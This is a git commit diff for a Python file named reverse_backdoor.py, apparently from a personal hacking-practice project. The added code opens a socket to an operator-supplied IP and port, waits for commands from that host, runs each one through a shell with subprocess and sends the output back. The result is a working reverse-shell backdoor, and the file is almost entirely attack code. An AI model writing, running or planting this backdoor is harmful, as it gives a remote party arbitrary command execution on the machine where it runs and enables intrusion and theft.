29f41b15dde052c3ce11fdd13e1dec96caddcc5a
KIRA <kanavraina98@gmail.com>
2018-09-26 00:44:02 +0530

    Update reverse_backdoor.py
    updated backdoor

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,7 +1,17 @@
 import socket
+import subprocess
+
+def execute_system_command(command):
+    return subprocess.check_output(command,shell=True)
 
 connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #(family,type)
-ip=raw_input("Enter the host ip")
-
-port=int(input("Enter the pore"))
+ip=raw_input("Enter the host ip: ")
+port=int(input("Enter the port: "))
 connection.connect((ip,port))
+connection.send("\n[+] Connection established.\n")
+while True:
+    command=connection.recv(1024)
+    command_result=execute_system_command(command)
+    connection.send(command_result)
+
+connection.close()
